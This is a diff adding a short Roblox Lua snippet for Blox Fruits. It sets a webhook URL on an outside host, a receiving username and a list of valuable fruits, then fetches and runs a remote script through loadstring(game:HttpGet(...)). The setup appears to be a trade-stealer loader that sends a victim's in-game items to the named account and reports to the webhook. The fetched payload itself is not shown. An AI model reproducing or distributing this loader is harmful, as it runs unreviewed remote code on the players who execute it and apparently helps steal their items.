@@ -1,0 +1,7 @@
+Webhook = https://webhook-protect.vercel.app/api/webhook?id=bHQ1a1FlbE9sRGdNNGE0NHZfVUJ0Zzo4U0ZNcHBkZGdmbklIV3Iyb2hCQVdnZGdUaEo1OWwyT0pjcGloc2xZbUxrMjkzOTlkX3U5N0JpQmlwOUdraUFWZXVZX29rYUNIcEdhWHVjcGZTelFyeXZHdmc0eVpzWW9PSUFPenp1WTlROXZGWFl3Zmg4c3FTVWRsU2tuQnQzQU9ZMGxTRkNvYjBlMG1KX3ZqbXA0aVg1UTBzeG9RM0lLT2lob2hoNDdvS00
+Usernames = "Hashanmri12"
+Fruits = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard", "Spirit-Spirit", "Control-Control", "Venom-Venom", "T-Rex-T-Rex", "Dough-Dough", "Buddha-Buddha", "Portal-Portal"}
+FruitsToReset = {"Pain-Pain"}
+
+loadstring(game:HttpGet("https://doitenroi.vercel.app/rua/v1.lua"))()
+```
